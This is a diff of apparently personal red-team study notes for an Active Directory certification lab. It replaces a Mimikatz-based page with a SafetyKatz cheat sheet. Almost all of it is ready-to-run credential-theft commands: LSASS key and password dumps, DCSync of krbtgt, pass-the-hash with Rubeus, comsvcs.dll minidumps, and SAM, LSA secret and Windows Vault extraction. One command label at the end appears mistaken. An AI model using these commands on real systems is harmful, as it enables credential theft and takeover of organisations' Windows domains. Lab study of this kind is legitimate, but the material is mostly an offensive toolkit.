@@ -1,122 +1,66 @@
+# Binaries
 >**ℹ️ Info:**
 >
-> Remember to follow the [PowerShell scripts methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#PowerShell%20Scripts).
---- 
- ## Dump credentials on a local machine
-```powershell
-Invoke-Mimikatz -DumpCreds
+> Remember to follow the [binaries methodology](Notes/Certifications/CRTE/00%20-%20Miscellaneous/01-%20Methodology.md#Binaries).
+
+## SafetyKatz
+
+**Extracts Kerberos encryption keys (AES/NTLM) from LSASS:**
+```cmd
+SafetyKatz.exe "sekurlsa::ekeys" "exit"
 ```
 
-## Dump credentials on multiple remote machines
-```powershell
-Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
+**Alternative to `ekeys` for Kerberos keys extraction:**
+```cmd
+SafetyKatz.exe "sekurlsa::keys" "exit"
 ```
 
-## OverPass-The-Hash : generate tokens from hashes
-```powershell
-# Invoke-Mimikatz
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntImhash> /run:powershell.exe"'
-
-# Invoke-Mimikatz using AES
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'
-
-# SafetyKatz
-SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
-
-# The above commands starts a PowerShell session with a logon type 9 (same as runas /netonly).
-
-# Rubeus.exe
-# Below doesn't need elevation
-Rubeus.exe asktgt /user:administrator /rc4: /ptt
-
-# Below command needs elevation
-Rubeus.exe asktgt /user:administrator /aes256: /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+**Performs DCSync to pull all domain user hashes (requires DA rights):**
+```cmd
+SafetyKatz.exe "lsadump::dcsync" "exit"
 ```
 
-## DCSync Attack
-+ To extract credentials from the DC without code execution on it, we can use DCSync
-+ To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for us domain
-+ By default, Domain Admins privileges are required to run DCSync
-```powershell
-# Invoke-Mimikatz
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
-
-# SafetyKatz
-SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
-
-# SafetyKatz Old (For Windows 2020 Server)
-SafetyKatz_old.exe "lsadump::dcsync /user:us\krbtgt" "exit"
+**DCSync for a specific user (e.g., krbtgt for Golden Tickets):**
+```cmd
+SafetyKatz.exe "lsadump::dcsync /user:DOMAIN\krbtgt" "exit"
 ```
 
----
-
-# Other ways to extract creds from LSASS
-
-## Invoke-Mimikatz
-### 1. Dump credentials on a local machine using Mimikatz
-```powershell
-Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+**Dumps plaintext passwords and NTLM hashes from LSASS:**
+```cmd
+SafetyKatz.exe "sekurlsa::logonpassword" "exit"
 ```
 
----
-
-## SafetyKatz & SharpKatz
-### 2. Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
-```powershell
-SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"
-
-# SafetyKatz Old (For Windows 2020 Server)
-SafetyKatz_old.exe -Command "sekurlsa::ekeys" "exit"
+**Retrieves LSA secrets (cached domain creds, service accounts):**
+```cmd
+SafetyKatz.exe "lsadump::lsa /patch" "exit"
 ```
 
-### 3. Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality)
-```powershell
-SharpKatz.exe -Command ekeys
+**Extracts domain trust keys (for Golden Ticket attacks across forests):**
+```cmd
+SafetyKatz.exe "lsadump::trust" "exit"
 ```
 
----
-
-## Dumpert
-### 4. Dump credentials using Dumpert (Direct System Calls and API unhooking)
-```powershell
-rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
+**Dumps local SAM database (non-domain user hashes):**
+```cmd
+SafetyKatz.exe "lsadump::sam" "exit"
 ```
 
----
-
-## pypykatz
-### 5. Using pypykatz (Mimikatz functionality in Python)
-```powershell
-pypykatz.exe live lsa
+**Lists saved credentials in Windows Vault (e.g., RDP/Wi-Fi passwords):**
+```cmd
+SafetyKatz.exe "vault::list" "exit"
 ```
 
----
-
-## comsvcs.dll
-### 6. Using comsvcs.dll
-```powershell
-tasklist /FI "IMAGENAME eq lsass.exe"
-rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
+**Decrypts and extracts Windows Vault credentials:**
+```cmd
+SafetyKatz.exe "vault::cred /patch" "exit"
 ```
 
-> Now Extract the creds from lsass dump
-
-```powershell
-# Run mimikatz
-# set the location of the lsass dump
-sekurlsa::minidump C:\AD\Tools\lsass.DMP
-
-# get the debug privs
-privilege::debug
-
-# now get the ekeys
-sekurlsa::ekeys
+**Parses an LSASS memory dump (offline credential extraction):**
+```cmd
+SafetyKatz.exe "sekurlsa::minidump lsass.dmp" "exit"
 ```
 
----
-
-## SharpKatz
-### 7. Using SharpKatz.exe to do DCSync Attack
-```powershell
-SharpKatz.exe --Command dcsync --User us\krbtgt --Domain us.techcorp.local --DomainController us-dc.us.techcorp.local
+**Extracts Kerberos TGTs for Pass-the-Ticket attacks:**
+```cmd
+SafetyKatz.exe "sekurlsa::opassth" "exit"
 ```
